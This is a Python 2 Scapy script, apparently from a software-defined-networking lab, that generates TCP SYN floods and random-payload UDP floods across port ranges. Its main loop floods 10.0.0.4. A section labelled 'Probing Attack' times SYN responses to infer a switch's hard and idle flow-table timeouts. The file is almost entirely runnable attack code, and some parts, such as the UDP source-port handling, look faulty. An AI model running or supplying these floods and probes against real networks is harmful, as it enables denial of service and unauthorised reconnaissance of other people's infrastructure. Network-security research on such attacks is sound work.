# ! /user/bin/python

import logging

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
from scapy.layers.inet import *
from scapy.layers.dhcp import *
from scapy.layers.dns import *



def naive(dst_ip, dst_port, pkt_size=100, inter=0.05):
    send_tcp(dst_ip, dst_port, pkt_size, inter)


# Probing Attack
# inter = idle-time
def senior(dst_ip, dst_port, pkt_size=100, idle=10):
    inter_pkt = float(idle)/(dst_port[1]-dst_port[0]+1)
    i = 1
    while True:
        print "Round %s, send TCP packets to host %s : %s" % (i, dst_ip, dst_port)
        send_tcp(dst_ip, dst_port, pkt_size, inter_pkt)
        i += 1

# Usage: send_udp('10.0.0.3-8', (2000,20000), 100, 0.05)
# Using random port to send UDP packets to (10.0.0.3/4/5/6/7/8, port 2000,2001,...20000)
# per packet size = 100bytes, interval per packet = 0.05s
def send_udp(dst_ip, dst_port, pkt_size=100, inter=0.05):
    src_port = dst_port
    udp_pkt = IP(dst=dst_ip) / UDP(sport=src_port, dport=dst_port)
    if len(udp_pkt) < pkt_size:
        udp_pkt = udp_pkt / Raw(RandString(size=pkt_size-20))
    send(udp_pkt, inter=inter)


# Usage: send_tcp('10.0.0.3-8', (2000,20000), 100, 0.05)
# Using random port to send TCP packets to (10.0.0.3/4/5/6/7/8, port 2000,2001,...20000)
# per packet size = 100bytes, interval per packet = 0.05s
def send_tcp(dst_ip, dst_port, pkt_size=100, inter=0.05):
    src_port = RandShort()
    tcp_pkt = IP(dst=dst_ip) / TCP(sport=src_port, dport=dst_port, flags='S')
    if len(tcp_pkt) < pkt_size:
        tcp_pkt = tcp_pkt / Raw(RandString(size=pkt_size-8))
    send(tcp_pkt, inter=inter)


def probe_hard(dst_ip, inter=1):
    # insert a new rule
    t_first = ping(dst_ip)
    if t_first == 0:
        return 0
    print 'Start: Hard timeout probe!'
    count = 0.0
    time.sleep(inter-0.01)
    while True:
        if ping(dst_ip) < t_first/3:
            print '......'
            time.sleep(inter-0.01)
            count += inter
            if count == 60:
                print 'Hard timeout > 60s, stop!'
                return 60, t_first
        else:
            print 'Finished: Hard timeout is %s s!' % count
            return count, t_first


def probe_idle(dst_ip, inter=1):
    print 'Start: Idle timeout probe!'
    hard_timeout, t_first = probe_hard(dst_ip, inter)
    time.sleep(inter)
    sum_time = 0.0 + inter
    count = sum_time
    while count < hard_timeout:
        print '......'
        count += inter
        sum_time += count
        print "new loop, count=%s, sum_time=%s" % (count, sum_time)
        # avoid flow-entry hard timeout
        if sum_time >= hard_timeout:
            time.sleep(hard_timeout-count+inter)
            # insert a new rule
            sr(IP(dst=dst_ip) / TCP(sport=4001,dport=5001,flags="S"), verbose=False)
            print 'wait to avoid hard timeout, count=%s' % count
            time.sleep(count)
            sum_time = count

        if ping(dst_ip) < t_first / 3:
            time.sleep(count)
        else:
            print 'Finished: Idle timeout is %s s!' % (count - inter)
            break


def ping(host, count=1):
    t = 0.0
    for x in range(count):
        # iface = 'eth0'
        ans, unans = sr(IP(dst=host) / TCP(sport=4001,dport=5001,flags="S"), verbose=False)
        if len(ans) != 0:
            rx = ans[0][1]
            tx = ans[0][0]
            delta = rx.time - tx.sent_time
            t += delta
        else:
            print 'Target host unreachable!!!'
            return 0

    return (t / count) * 1000

def main(num, size, inter):
    for i in range(0, 100000):
        # send_tcp(dst_ip='10.0.0.3', dst_port=(10, 9+int(num)), pkt_size=int(size), inter=float(inter))
        send_udp(dst_ip='10.0.0.4', dst_port=(10, 9+int(num)), pkt_size=int(size), inter=float(inter))

if __name__ == '__main__':
    main(sys.argv[1], sys.argv[2], sys.argv[3])
